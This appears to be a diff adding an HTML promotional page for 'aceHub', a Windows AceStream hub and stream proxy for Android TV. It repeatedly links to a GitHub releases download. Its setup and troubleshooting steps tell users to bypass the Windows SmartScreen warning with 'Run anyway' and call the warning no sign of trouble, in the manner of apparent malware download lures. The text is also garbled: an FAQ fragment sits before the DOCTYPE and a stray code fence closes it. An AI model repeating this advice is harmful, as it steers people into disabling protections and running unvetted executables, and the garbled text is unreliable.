+    <p class="faq-a">You still need an internet connection<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>aceHub - High-Performance Headless AceStream Hub &amp; LAN Stream Proxy for Android TV</title>
+<meta name="description" content="aceHub is a high-performance headless AceStream hub and universal LAN stream proxy for Android TV. Runs on port 8000, uses 0 transcode, and delivers a TTFB under 50ms. Download aceHub for Windows in a few clicks.">
+<meta name="keywords" content="aceHub, AceStream hub, headless AceStream, LAN stream proxy, Android TV streaming, port 8000, no transcode, low latency streaming, stream proxy Windows, AceStream proxy">
+<meta name="author" content="aceHub">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#12b3a6">
+<link rel="canonical" href="https://github.com/Pinotnoirpasser385/aceHub">
+<meta property="og:type" content="website">
+<meta property="og:title" content="aceHub - High-Performance Headless AceStream Hub &amp; LAN Stream Proxy">
+<meta property="og:description" content="Share one AceStream connection with every device on your home network. Port 8000, zero transcode, TTFB under 50ms. Easy Windows download.">
+<meta property="og:url" content="https://github.com/Pinotnoirpasser385/aceHub">
+<meta property="og:site_name" content="aceHub">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="aceHub - Headless AceStream Hub for Android TV">
+<meta name="twitter:description" content="A fast, lightweight AceStream hub and LAN proxy. Port 8000, 0 transcode, TTFB under 50ms. Download for Windows from the official releases page.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "aceHub",
+  "applicationCategory": "MultimediaApplication",
+  "operatingSystem": "Windows 10, Windows 11",
+  "description": "High-Performance Headless AceStream Hub & Universal LAN Stream Proxy for Android TV. Port 8000, 0 transcode, TTFB under 50ms.",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  },
+  "downloadUrl": "https://github.com/Pinotnoirpasser385/aceHub/releases"
+}
 </script>
+<style>
+  :root {
+    --ink: #1b2430;
+    --muted: #55606e;
+    --line: #e2e8f0;
+    --brand: #12b3a6;
+    --brand-2: #7a4dff;
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f4f7fb;
+    color: var(--ink);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  main {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 48px 22px 70px;
+  }
+  h1 {
+    font-size: 2.15rem;
+    line-height: 1.25;
+    letter-spacing: -0.02em;
+    margin: 0 0 18px;
+    color: #0f172a;
+  }
+  h2 {
+    font-size: 1.42rem;
+    line-height: 1.35;
+    margin: 52px 0 14px;
+    color: #0f172a;
+    letter-spacing: -0.01em;
+  }
+  h3 {
+    font-size: 1.08rem;
+    margin: 26px 0 8px;
+    color: #0f172a;
+  }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; }
+  li { margin-bottom: 10px; }
+  a { color: #0b6bcb; text-decoration: underline; }
+  a:hover { color: #084d93; }
+  strong { color: #0f172a; }
+  .lead {
+    font-size: 1.12rem;
+    color: var(--muted);
+    margin-bottom: 28px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 17px 34px;
+    border-radius: 14px;
+    background: linear-gradient(135deg, #12b3a6 0%, #7a4dff 100%);
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.05rem;
+    text-decoration: none;
+    box-shadow: 0 10px 24px rgba(18, 179, 166, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+    margin: 6px 0 10px;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 28px rgba(122, 77, 255, 0.34);
+    color: #ffffff;
+    text-decoration: none;
+  }
+  .btn-note {
+    display: block;
+    font-size: 0.92rem;
+    color: var(--muted);
+    margin-top: 4px;
+  }
+  .card {
+    background: #ffffff;
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 24px 26px;
+    box-shadow: 0 6px 18px rgba(15, 23, 42, 0.06);
+    margin: 22px 0;
+  }
+  .callout {
+    background: #fffdf5;
+    border: 1px solid #f3e2b3;
+    border-left: 5px solid #f0b429;
+    border-radius: 12px;
+    padding: 18px 22px;
+    margin: 22px 0;
+  }
+  .steps {
+    background: #ffffff;
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 22px 28px 8px;
+    box-shadow: 0 6px 18px rgba(15, 23, 42, 0.06);
+  }
+  .steps ol { padding-left: 22px; }
+  .faq-q { font-weight: 700; margin-bottom: 4px; color: #0f172a; }
+  .faq-a { color: var(--muted); margin-bottom: 20px; }
+  .divider {
+    height: 1px;
+    background: var(--line);
+    border: 0;
+    margin: 46px 0 0;
+  }
+  @media (max-width: 600px) {
+    main { padding: 32px 18px 56px; }
+    h1 { font-size: 1.65rem; }
+    h2 { font-size: 1.22rem; margin-top: 42px; }
+    .btn { width: 100%; text-align: center; padding: 16px 18px; }
+    .card, .steps { padding: 20px 18px 6px; }
+  }
+</style>
+</head>
+<body>
+<main>
+
+  <h1>📺 aceHub - Stream AceStream to Any Device Instantly</h1>
+
+  <p class="lead">
+    aceHub is a small, fast helper for your home network. It takes one AceStream link and shares it
+    with every device in your house &mdash; your TV, your tablet, your phone &mdash; at the same time.
+    It runs quietly in the background, needs no tinkering, and is built for Android TV.
+  </p>
+
+  <a class="btn" href="https://github.com/Pinotnoirpasser385/aceHub/releases">⬇ Download aceHub for Windows</a>
+  <span class="btn-note">Visit this link to download the application.</span>
+
+  <h2>What Is aceHub and Why Would You Want It?</h2>
+
+  <p>
+    If you have ever tried to watch a stream on more than one screen at home, you probably know the
+    problem: the stream plays on one device, but the second device has to fetch the same content all
+    over again. That eats your internet connection, causes buffering, and makes everyone in the room
+    unhappy.
+  </p>
+
+  <p>
+    aceHub fixes that. It is a <strong>headless hub</strong>, which simply means it works in the
+    background without a big fancy window on your screen. You start it, it sits quietly on your
+    computer, and it acts like a traffic manager for streams. One device fetches the content, and
+    aceHub passes it along to all the other devices on your home network &mdash; your LAN &mdash;
+    so nobody has to download the same thing twice.
+  </p>
+
+  <p>
+    It works on <strong>port 8000</strong>, it uses <strong>0 transcode</strong> (meaning the video
+    is passed through exactly as it arrives, with no quality loss and no heavy lifting), and it
+    responds in <strong>under 50 milliseconds</strong> (TTFB, or time to first byte). In plain
+    language: the picture starts almost instantly, and your computer barely breaks a sweat.
+  </p>
+
+  <h2>✨ Key Features at a Glance</h2>
+
+  <ul>
+    <li><strong>One stream, many screens.</strong> Share a single stream with every TV, phone, tablet, and computer on your home network at the same time.</li>
+    <li><strong>Headless and out of the way.</strong> aceHub runs in the background. No cluttered window, no distractions. Start it and forget it.</li>
+    <li><strong>No quality loss.</strong> With zero transcoding, the video you see is exactly the video that arrived. Nothing is re-compressed or softened.</li>
+    <li><strong>Very low latency.</strong> A time to first byte of under 50ms means streams begin playing almost the moment you press play.</li>
+    <li><strong>Lightweight and fast.</strong> Built for performance, so it runs happily on an everyday Windows computer without eating all your memory.</li>
+    <li><strong>Made for Android TV.</strong> Point your Android TV player at your computer's address and port 8000, and you are watching in seconds.</li>
+    <li><strong>Universal LAN proxy.</strong> It does not care which app or box you use. If it can open a network stream, it can work with aceHub.</li>
+  </ul>
+
+  <h2>📋 What You Need Before You Start</h2>
+
+  <p>
+    Nothing exotic. If you have an ordinary home computer and a TV, you almost certainly have
+    everything on this list already.
+  </p>
+
+  <ul>
+    <li><strong>A Windows computer</strong> running Windows 10 or Windows 11 (64-bit recommended). This is the machine that will run aceHub.</li>
+    <li><strong>A home internet connection</strong> &mdash; a normal broadband connection is fine. A wired connection to your router gives the smoothest results, but Wi-Fi works too.</li>
+    <li><strong>A home network</strong> where your computer and your TV are connected to the same router. This is the "LAN" part, and it is what makes the sharing possible.</li>
+    <li><strong>An Android TV device</strong> &mdash; a TV with Android TV built in, or an Android TV box or streaming stick connected to your television.</li>
+    <li><strong>A stream player app</strong> on the TV that can open a network address. Most people already have one installed.</li>
+    <li><strong>About ten minutes</strong> of your time, most of which is spent waiting for the download to finish.</li>
+  </ul>
+
+  <h2>🚀 Download and Set Up aceHub</h2>
+
+  <p>
+    Everything you need lives on the official releases page. That is the only place you should get
+    aceHub from, because that is where the current, working version is always published.
+  </p>
+
+  <a class="btn" href="https://github.com/Pinotnoirpasser385/aceHub/releases">⬇ Get aceHub from the Releases Page</a>
+  <span class="btn-note">Visit this link to download the application.</span>
+
+  <div class="steps">
+    <ol>
+      <li>Click the download button above. Your web browser will open the aceHub releases page.</li>
+      <li>On that page, find the newest release at the top of the list. Newer is better &mdash; older releases are kept only for reference.</li>
+      <li>Under that release, download the application file. If your browser asks whether to keep the file, choose to keep it.</li>
+      <li>When the download finishes, open the file you just downloaded. Your browser usually shows it in the downloads bar at the bottom, or in your Downloads folder.</li>
+      <li>If Windows shows a blue "Windows protected your PC" box, click <em>More info</em> and then <em>Run anyway</em>. This message appears for many small independent apps and is not a sign that something is wrong.</li>
+      <li>Leave aceHub running in the background. You can minimise it &mdash; it will keep working.</li>
+    </ol>
+  </div>
+
+  <div class="callout">
+    <strong>One important habit:</strong> keep aceHub running while you watch. The moment you close
+    it, your TV and other devices lose their connection to the stream. If something stops working
+    halfway through a film, check that aceHub is still open first.
+  </div>
+
+  <h2>🎬 Using aceHub for the First Time</h2>
+
+  <p>
+    Once aceHub is running, it listens quietly on <strong>port 8000</strong>. Think of port 8000 as
+    the door number of your computer on the home network &mdash; it tells other devices exactly where
+    to knock.
+  </p>
+
+  <p>
+    To use it, you need to know your computer's local address. Here is how to find it, without any
+    technical knowledge:
+  </p>
+
+  <ol>
+    <li>On your Windows computer, click the Start button and type <strong>cmd</strong>, then press Enter. A small black window opens.</li>
+    <li>Type <strong>ipconfig</strong> and press Enter.</li>
+    <li>Look for the line that says <strong>IPv4 Address</strong>. It will look something like <strong>192.168.1.25</strong>. Write that number down.</li>
+    <li>Your aceHub address is that number followed by <strong>:8000</strong>. For example: <strong>http://192.168.1.25:8000</strong>.</li>
+    <li>Close the black window. You will not need it again.</li>
+  </ol>
+
+  <p>
+    Keep that address somewhere handy. You will type it into your TV once, and then you can save it
+    as a favourite so you never have to type it again.
+  </p>
+
+  <h2>📡 Playing Streams on Your Android TV</h2>
+
+  <div class="steps">
+    <ol>
+      <li>Make sure your Android TV and your Windows computer are connected to the <strong>same</strong> home router. This is the most common reason things do not work.</li>
+      <li>Open the stream player app on your Android TV.</li>
+      <li>Choose the option to open a network stream or a custom address. Wording varies between apps, but it is usually called something like <em>Open URL</em>, <em>Add stream</em>, or <em>Network stream</em>.</li>
+      <li>Type the aceHub address you wrote down, including the port number. For example: <strong>http://192.168.1.25:8000</strong>.</li>
+      <li>Confirm, and the stream should begin playing within a second or two. Thanks to the sub-50ms response time, there is almost no waiting.</li>
+      <li>Open the same address on a second device, and it will play there too &mdash; without pulling the same content down from the internet again.</li>
+    </ol>
+  </div>
+
+  <p>
+    Because aceHub does not transcode, the video arrives on your TV exactly as it left the source.
+    That means no waiting for the computer to convert anything, no dropped frames from an overloaded
+    processor, and no drop in picture quality.
+  </p>
+
+  <h2>🔧 Troubleshooting Common Issues</h2>
+
+  <h3>The stream does not start on my TV</h3>
+  <ul>
+    <li>Check that aceHub is still running on your computer. If you closed it, start it again.</li>
+    <li>Check that both devices are on the same home network. A TV on a separate guest network will not be able to reach your computer.</li>
+    <li>Re-check the address. A missing <strong>:8000</strong> at the end is the single most common mistake.</li>
+  </ul>
+
+  <h3>The picture stutters</h3>
+  <ul>
+    <li>If your computer uses Wi-Fi, try connecting it to the router with a cable. This alone fixes most stutter.</li>
+    <li>Move closer to the router if you are on Wi-Fi, or reduce the number of devices streaming at the same time.</li>
+    <li>Close other programs on the computer that are using a lot of internet bandwidth.</li>
+  </ul>
+
+  <h3>Windows shows a warning when I open the app</h3>
+  <ul>
+    <li>Click <em>More info</em>, then <em>Run anyway</em>. Windows shows this for many independent applications that have not paid for a commercial signature.</li>
+  </ul>
+
+  <h3>I cannot find the file I downloaded</h3>
+  <ul>
+    <li>Open File Explorer and click <em>Downloads</em> on the left side. Sort the folder by date, and your file will be at the top.</li>
+    <li>In most browsers you can also press <strong>Ctrl + J</strong> to see your download list.</li>
+  </ul>
+
+  <h2>❓ Frequently Asked Questions</h2>
+
+  <div class="card">
+    <p class="faq-q">Is aceHub free to use?</p>
+    <p class="faq-a">Yes. aceHub is released publicly and you can download it from the official releases page at no cost.</p>
+
+    <p class="faq-q">Do I need to install anything on my Android TV?</p>
+    <p class="faq-a">No. aceHub runs on your Windows computer. Your TV only needs a player app that can open a network address, which most Android TV devices already have.</p>
+
+    <p class="faq-q">Why does port 8000 matter?</p>
+    <p class="faq-a">Port 8000 is the "door" aceHub uses on your computer. When you type your computer's address followed by :8000, you are telling the TV which door to knock on.</p>
+
+    <p class="faq-q">What does "0 transcode" mean for me?</p>
+    <p class="faq-a">It means aceHub passes the video straight through without re-processing it. The result is a faster start, lower processor use on your computer, and no loss of picture quality.</p>
+
+    <p class="faq-q">Can several people watch at the same time?</p>
+    <p class="faq-a">Yes. That is exactly what aceHub is built for. One connection is shared across the devices on your home network, so multiple screens can watch together.</p>
+
+    <p class="faq-q">Does aceHub work without an internet connection?</p>
+    <p class="faq-a">You still need an internet connection to bring the original stream in for the first time. Once aceHub has it, the sharing between your computer and your TV happens entirely on your own home network, which is why playback on extra screens feels so fast.</p>
+
+    <p class="faq-q">Will aceHub slow down my computer?</p>
+    <p class="faq-a">It is designed to be light on resources. Because nothing is transcoded, the processor does very little work, and the app is meant to sit quietly in the background while you watch.</p>
+
+    <p class="faq-q">Where should I get updates from?</p>
+    <p class="faq-a">Always from the official releases page linked on this page. Check back there when you want the newest version.</p>
+  </div>
+
+  <hr class="divider">
+
+</main>
 </body>
 </html>
+```
